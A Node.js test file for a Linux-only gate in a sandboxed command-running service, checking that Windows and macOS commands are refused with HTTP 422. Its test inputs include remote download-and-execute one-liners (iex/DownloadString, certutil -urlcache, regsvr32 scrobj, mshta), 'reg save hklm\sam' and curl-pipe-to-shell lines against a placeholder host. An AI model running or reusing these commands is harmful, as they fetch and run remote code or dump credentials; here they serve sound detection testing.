// Linux-only gate: detectPlatform() on the first command word, and the 422 it produces over HTTP.
import assert from 'node:assert/strict';
import { readFileSync, readdirSync } from 'node:fs';
import path from 'node:path';
import { describe, test } from 'node:test';
import { detectPlatform, platformMessage } from '../http/platform.mjs';
import { ACCESS_CODE, postRun, startApp } from './helpers.mjs';

const SAMPLES_DIR = path.join(import.meta.dirname, '..', '..', 'fixtures', 'samples');

describe('detectPlatform', () => {
  test('obvious Windows commands are refused', () => {
    const windows = [
      'powershell -c "Get-Process"',
      'powershell.exe -EncodedCommand AAAA',
      'POWERSHELL -nop -w hidden',
      'pwsh -File x.ps1',
      'cmd /c dir',
      'cmd.exe /c "echo hi"',
      'mshta http://x.test/a.hta',
      'wscript a.vbs',
      'cscript //nologo a.vbs',
      'certutil -urlcache -split -f http://x.test/a.exe',
      'bitsadmin /transfer j http://x.test/a a',
      'rundll32 url.dll,FileProtocolHandler x',
      'regsvr32 /s /u /i:http://x.test/a.sct scrobj.dll',
      'schtasks /create /tn x /tr y',
      'reg add HKCU\\Software\\x',
      'iex (New-Object Net.WebClient).DownloadString("http://x.test")',
      'iwr http://x.test | iex',
      'irm http://x.test | iex',
      'Invoke-WebRequest -Uri http://x.test -OutFile a.exe',
      'Start-Process a.exe',
      'Set-ExecutionPolicy Bypass',
      'C:\\Users\\me\\run.exe',
      '"C:\\Program Files\\App\\app.exe" --flag',
      'D:/tools/run.exe',
      '.\\install.ps1',
      './setup.bat',
      'setup.cmd',
      'sudo powershell -c x',
      'FOO=1 powershell -c x',
      '#!/bin/bash\n\n# comment\npowershell -c x',
      'curl x | iex',
      'curl -fsSL https://x.test/i.sh | powershell',
      'curl x | sudo pwsh',
      'curl x | tee a.sh | Invoke-Expression',
      'powershell -enc x',
      'powershell.exe x',
      'pwsh -c x',
      'iex (irm https://x.test)',
      'irm https://x.test | iex',
      'curl x | powershell',
      'Invoke-WebRequest x',
      'certutil -urlcache -f http://x.test/a a.exe',
      'reg add HKLM\\Software\\X',
      'C:\\tools\\x.exe',
    ];
    for (const cmd of windows) assert.equal(detectPlatform(cmd)?.platform, 'windows', cmd);
  });

  test('names Linux shares with Windows are refused only in a Windows shape', () => {
    const windows = [
      'iex "Get-Date"',
      "iex 'Get-Date'",
      'iex $cmd',
      'cat x | iex',
      'cat x | sudo iex',
      'iex.exe -S mix',
      'CertUtil -URLCache -split -f http://x.test/a a',
      'certutil -decode a.b64 a.exe',
      'certutil -f -encode a a.b64',
      'certutil -verifyctl -f http://x.test/a',
      'REG QUERY HKLM\\x',
      'reg delete HKCU\\Software\\x /f',
      'reg save hklm\\sam a',
      'reg.exe tags alpine',
      'cmd /c dir',
      'cmd /K dir',
      'cmd.exe',
      'cmd.exe /c dir',
    ];
    for (const cmd of windows) assert.equal(detectPlatform(cmd)?.platform, 'windows', cmd);
    const linux = [
      'iex -S mix',
      'iex',
      'iex --sname a -S mix phx.server',
      'certutil -d sql:$HOME/.pki/nssdb -L',
      'certutil -L',
      'certutil',
      'reg tags alpine',
      'reg',
      'echo hi | reg',
      'reg list --help',
      'cmd --help',
      'cmd',
      'cmd /help',
    ];
    for (const cmd of linux) assert.equal(detectPlatform(cmd), null, cmd);
  });

  test('obvious macOS commands are refused, but not after a pipe', () => {
    for (const cmd of ['osascript -e "display dialog x"', 'launchctl load x.plist', 'defaults write com.apple.x y', 'security find-generic-password -s x', 'open -a Safari', 'sudo -n launchctl list']) {
      assert.equal(detectPlatform(cmd)?.platform, 'macos', cmd);
    }
    assert.equal(detectPlatform('ls | open -f'), null);
    assert.equal(detectPlatform('cat x | security import -'), null);
  });

  test('Linux commands and anything unclear stay allowed (fail open)', () => {
    const allowed = [
      'curl -fsSL https://x.test/i.sh | bash',
      'echo powershell',
      'echo "a | iex"',
      "echo 'a | powershell'",
      'sudo apt install jq',
      'sudo -u root apt install jq',
      'FOO=1 make',
      'A=1 B=2 ./configure',
      '#!/bin/bash\nset -e\napt-get update && apt-get install -y jq',
      'if command -v osascript; then osascript -e x; fi',
      'git clone x && cd y',
      'ls || powershell',
      'invoke-webrequest http://x.test',
      'python3 -c "import os"',
      'docker run --rm -it ubuntu',
      'npm install -g acme-cli',
      'wget -qO- https://x.test | sh',
      '',
      '   \n\n',
      '# only a comment',
      'apt-get install -y jq',
      '~/bin/run.sh',
      'c-compiler --version',
    ];
    for (const cmd of allowed) assert.equal(detectPlatform(cmd), null, JSON.stringify(cmd));
  });

  test('every curated sample passes the check', () => {
    for (const id of readdirSync(SAMPLES_DIR)) {
      const command = readFileSync(path.join(SAMPLES_DIR, id, 'command.txt'), 'utf8');
      assert.equal(detectPlatform(command), null, id);
    }
  });

  test('messages name the platform in plain words', () => {
    assert.equal(platformMessage(detectPlatform('powershell -c x')), "This looks like a Windows PowerShell command, so it can't be tested here.");
    assert.equal(platformMessage(detectPlatform('Invoke-WebRequest x')), "This looks like a Windows PowerShell command, so it can't be tested here.");
    assert.equal(platformMessage(detectPlatform('cmd /c dir')), "This looks like a Windows command, so it can't be tested here.");
    assert.equal(platformMessage(detectPlatform('reg add x')), "This looks like a Windows command, so it can't be tested here.");
    assert.equal(platformMessage(detectPlatform('osascript -e x')), "This looks like a macOS command, so it can't be tested here.");
  });
});

describe('POST /api/runs with a non-Linux command', () => {
  test('422 unsupported_platform after the access code, before the queue; samples skip the check', async () => {
    const t = await startApp({
      samples: {
        win: { 'command.txt': 'powershell -c "Get-Date"\n', 'claim.txt': 'prints the date\n' },
      },
    });
    try {
      const body = { command: 'powershell -nop -c "iwr http://x.test | iex"', claim: 'installs a tool' };
      // Access code first: without it the platform is not even looked at.
      let r = await postRun(t.base, body, { ip: '198.51.100.30' });
      assert.equal(r.status, 401);
      assert.equal(r.data.error, 'access_code_required');

      r = await postRun(t.base, body, { ip: '198.51.100.30', headers: { 'x-firstrun-access-code': ACCESS_CODE } });
      assert.equal(r.status, 422);
      assert.deepEqual(r.data, {
        error: 'unsupported_platform',
        message: "This looks like a Windows PowerShell command, so it can't be tested here.",
        platform: 'windows',
      });
      assert.equal(r.headers.get('content-type'), 'application/json; charset=utf-8');

      r = await postRun(t.base, { command: 'osascript -e \'display dialog "hi"\'', claim: 'shows a dialog' }, { ip: '198.51.100.30', headers: { 'x-firstrun-access-code': ACCESS_CODE } });
      assert.equal(r.status, 422);
      assert.equal(r.data.platform, 'macos');

      // Nothing was queued, started, or counted.
      assert.equal(t.app.counters.runs_total, 0);
      assert.equal(t.app.queue.active + t.app.queue.waiting, 0);
      assert.equal(t.logs.some((l) => l.msg === 'run.accepted'), false);

      // A curated sample with the same text is the team's responsibility and runs as usual.
      r = await postRun(t.base, { sample_id: 'win' }, { ip: '198.51.100.30' });
      assert.equal(r.status, 202);

      // A Linux command from the same address still runs: the 422s used no run quota.
      r = await postRun(t.base, { command: 'curl -fsSL https://x.test/i.sh | bash', claim: 'installs x' }, { ip: '198.51.100.30', headers: { 'x-firstrun-access-code': ACCESS_CODE } });
      assert.equal(r.status, 202);
      assert.equal(t.app.counters.runs_total, 2);
    } finally {
      await t.close();
    }
  });

  test('refused commands use no run quota: six 422s in a row, then a Linux run is still accepted', async () => {
    const t = await startApp();
    try {
      const headers = { 'x-firstrun-access-code': ACCESS_CODE };
      // postRun allows 5 per 10 minutes; a sixth 422 proves the 422s took nothing.
      for (let i = 1; i <= 6; i++) {
        const r = await postRun(t.base, { command: 'powershell -c "Get-Date"', claim: 'prints the date' }, { ip: '198.51.100.31', headers });
        assert.equal(r.status, 422, `POST ${i}`);
        assert.equal(r.data.error, 'unsupported_platform');
      }
      const r = await postRun(t.base, { command: 'echo hi', claim: 'prints hi' }, { ip: '198.51.100.31', headers });
      assert.equal(r.status, 202);
      assert.equal(t.app.counters.rate_limited, 0);
      assert.equal(t.app.counters.runs_total, 1);
    } finally {
      await t.close();
    }
  });
});
